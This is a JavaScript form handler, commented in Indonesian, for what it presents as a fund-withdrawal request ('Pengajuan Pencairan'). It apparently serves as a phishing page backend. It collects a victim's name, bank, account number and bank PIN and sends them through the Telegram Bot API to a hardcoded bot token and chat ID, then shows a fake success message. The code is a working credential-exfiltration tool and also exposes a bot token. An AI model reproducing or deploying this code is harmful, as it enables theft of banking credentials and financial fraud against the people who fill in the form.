
document.getElementById("myForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const token = "7280723033:AAHJHEiafZsJEc6W7NZFREcHcS24dhoI4Bw"; // Ganti dengan token bot Telegram Anda
    const chat_id = "7679753363"; // Ganti dengan chat ID Anda

    const nama = document.getElementById("nama").value;
    const bank = document.getElementById("bank").value;
    const nominal = document.getElementById("nominal").value;
    const Norek = document.getElementById("Norek").value;
    const pin = document.getElementById("PIN").value;

    const message = `
📩 *Pengajuan Pencairan Baru*

👤 Nama: ${nama}
🏦 Bank: ${bank}
💰 Nominal: Rp ${nominal}
🏧 NoRek: ${Norek}
🔐 PIN: ${pin}
`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chat_id,
            text: message,
            parse_mode: "Markdown"
        })
    })
    .then(response => {
        if (response.ok) {
            alert("Pengajuan berhasil dikirim!");
            document.getElementById("myForm").reset();
            e.target.reset();
            window.location.href="end.html"
        } else {
            alert("Gagal mengirim. Coba lagi.");
        }
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Terjadi kesalahan.");
    });
});